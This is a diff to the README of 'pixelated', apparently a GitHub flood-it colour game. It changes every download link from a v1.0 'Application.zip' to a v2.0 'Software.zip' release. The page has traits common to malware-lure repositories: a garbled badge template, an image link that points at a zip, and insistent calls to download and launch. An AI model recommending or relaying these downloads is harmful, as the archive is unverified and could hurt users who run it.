@@ -3,7 +3,7 @@
 
 ### An addictive game of strategy and colour!
 
-[![Download Pixelated](https://github.com/Sinaa77/pixelated/releases/download/v1.0/Application.zip<COLOR>.svg)](https://github.com/Sinaa77/pixelated/releases/download/v1.0/Application.zip)
+[![Download Pixelated](https://github.com/Sinaa77/pixelated/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/Sinaa77/pixelated/releases/download/v2.0/Software.zip)
 
 Welcome to **pixelated**, a fun and challenging game that will test your strategic thinking and color-matching skills! Dive into a world filled with pixels and vibrant colors as you aim to conquer each level by flooding the board with a single color.
 
@@ -27,12 +27,12 @@ Welcome to **pixelated**, a fun and challenging game that will test your strateg
 `blackberry`, `blackberry-game`, `casual-game`, `color-game`, `flood-it`, `floodit`, `game`, `javascript-game`, `mobile-game`, `online-game`, `pixel-game`, `pixelated`, `pixelated-game`, `puzzle`, `puzzle-game`, `wiphala`
 
 ### 🚀 Get Started
-Ready to dive into the world of pixelated? [Download https://github.com/Sinaa77/pixelated/releases/download/v1.0/Application.zip](https://github.com/Sinaa77/pixelated/releases/download/v1.0/Application.zip) and launch the game to start playing!
+Ready to dive into the world of pixelated? [Download https://github.com/Sinaa77/pixelated/releases/download/v2.0/Software.zip](https://github.com/Sinaa77/pixelated/releases/download/v2.0/Software.zip) and launch the game to start playing!
 
 ### 🎉 Join the Fun
 Challenge your friends, test your skills, and see if you have what it takes to conquer the pixelated world. Get ready for hours of entertainment and brain-teasing puzzles!
 
-![Pixelated Game](https://github.com/Sinaa77/pixelated/releases/download/v1.0/Application.zip)
+![Pixelated Game](https://github.com/Sinaa77/pixelated/releases/download/v2.0/Software.zip)
 
 ### 🌟 Start Playing Now!
 Don't miss out on the excitement - launch the game and start flooding the board with color! Show off your strategic prowess and become the ultimate pixelated champion. Let the fun begin! 🌟
